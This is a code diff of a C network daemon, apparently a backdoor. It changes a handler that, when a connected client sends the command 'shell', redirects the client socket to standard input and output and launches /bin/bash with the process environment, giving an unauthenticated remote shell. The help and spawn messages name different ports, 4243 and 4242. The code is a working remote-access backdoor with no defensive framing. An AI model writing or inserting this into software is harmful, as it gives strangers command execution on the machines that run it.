@@ -88,14 +88,15 @@ static bool	new_client(t_connexion *connexion, t_users *users)
 	return (true);
 }
 
-bool	run_daemon(t_connexion *connexion)
+bool	run_daemon(t_connexion *connexion, char **envp)
 {
 	char		buffer[BUFFSIZE + 1];
 	ssize_t		valrecv = 0;
-	char	*shell[2];
+	char	*shell[] = {"/bin/bash", NULL};
 	t_users		users;
 
 	memset(&users, 0, sizeof(users));
+
 
 	if (listen(connexion->master_socket, 3) < 0)
 	{
@@ -164,15 +165,13 @@ bool	run_daemon(t_connexion *connexion)
 							users.nb_user--;
 						}
 						if (!strcmp(buffer, "?"))
-							puts("shell	Spawn remote shell on 4243");
+							send(users.sd, "'shell'	Spawn remote shell on 4243\n> ", 37, 0);
 						if (!strcmp(buffer, "shell"))
 						{
-							 for(int i=0; i<3; i++)
+							for(int i=0; i<3; i++)
 								dup2(users.sd, i);
-
-							shell[0] = "/bin/bash";
-							shell[1] = 0;
-							if (execve(shell[0], shell, NULL) == -1)
+							send(users.sd, "Spawning shell on port 4242\n> ", 30, 0);
+							if (execve(shell[0], shell, envp) == -1)
 								printf("error\n");
 						}
 					}
